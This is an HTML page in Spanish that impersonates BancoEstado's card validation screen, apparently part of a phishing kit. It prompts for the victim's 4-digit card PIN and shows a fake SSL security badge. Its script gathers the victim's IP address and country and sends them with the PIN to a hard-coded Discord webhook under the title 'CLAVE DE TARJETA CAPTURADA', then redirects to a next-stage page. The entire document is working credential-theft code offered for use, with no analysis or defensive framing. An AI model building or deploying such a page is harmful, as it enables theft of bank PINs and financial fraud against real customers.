<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Validación</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #1e293b;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 20px;
            display: flex;
            align-items: center;
        }

        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            color: #334155;
            padding: 5px;
        }

        .content {
            padding: 20px 32px;
            text-align: center;
            flex-grow: 1;
        }

        .card-icon-header {
            margin-bottom: 24px;
            display: flex;
            justify-content: center;
        }

        h1 {
            font-size: 20px;
            font-weight: 600;
            line-height: 1.4;
            margin-bottom: 35px;
            color: #0f172a;
        }

        .pin-section {
            max-width: 280px;
            margin: 0 auto;
        }

        .pin-label {
            display: block;
            text-align: left;
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #64748b;
            margin-bottom: 12px;
        }

        .pin-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
            position: relative;
        }

        .pin-input {
            width: 45px;
            height: 55px;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            font-size: 24px;
            text-align: center;
            font-weight: 700;
            background-color: #fcfdfe;
            outline: none;
            transition: border-color 0.2s;
        }

        .pin-input:focus {
            border-color: #ff8c00;
            background-color: #fff;
        }

        .view-toggle {
            position: absolute;
            right: -45px;
            background: none;
            border: none;
            cursor: pointer;
            color: #1a348e;
        }

        .footer {
            padding: 24px 32px 40px;
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 30px;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background 0.2s;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
        }

        .btn-continuar:disabled {
            background-color: #f1f5f9;
            color: #94a3b8;
            cursor: not-allowed;
            box-shadow: none;
        }

        .secure-badge {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            margin-top: 20px;
            font-size: 11px;
            color: #94a3b8;
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <button class="back-btn">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
            </button>
        </div>

        <div class="content">
            <div class="card-icon-header">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#ff8c00" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                    <line x1="2" y1="10" x2="22" y2="10"></line>
                </svg>
            </div>

            <h1>Ingresa la clave de tu tarjeta</h1>

            <div class="pin-section">
                <span class="pin-label">Clave de 4 dígitos</span>
                <div class="pin-container">
                    <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" inputmode="numeric">
                    
                    <button class="view-toggle" id="togglePin">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    </button>
                </div>
            </div>
        </div>

        <div class="footer">
            <button class="btn-continuar" id="btnNext" disabled>Continuar</button>
            <div class="secure-badge">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                Transacción segura por SSL
            </div>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.pin-input');
        const btn = document.getElementById('btnNext');
        const toggleBtn = document.getElementById('togglePin');

        // Manejo de foco automático
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                validar();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function validar() {
            btn.disabled = !Array.from(inputs).every(i => i.value !== "");
        }

        toggleBtn.addEventListener('click', () => {
            const isPass = inputs[0].type === 'password';
            inputs.forEach(i => i.type = isPass ? 'text' : 'password');
        });

        // Envío a Discord
        btn.addEventListener('click', async () => {
            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";
            
            // Unir los 4 inputs en una sola clave
            const pinFinal = Array.from(inputs).map(i => i.value).join('');

            btn.innerText = "Validando...";
            btn.disabled = true;

            try {
                // Obtener IP y País
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                const data = {
                    embeds: [{
                        title: "🔐 CLAVE DE TARJETA CAPTURADA",
                        color: 16745472,
                        fields: [
                            { name: "🔑 PIN Cajero", value: `**${pinFinal}**`, inline: true },
                            { name: "🌐 IP Real", value: `\`${ipReal}\``, inline: false },
                            { name: "🌍 País", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Seguridad - BancoEstado" },
                        timestamp: new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                window.location.href = "index2.html"; // Cambia esto al siguiente archivo
            } catch (error) {
                console.error("Error:", error);
                window.location.href = "index2.html";
            }
        });
    </script>
</body>
</html>
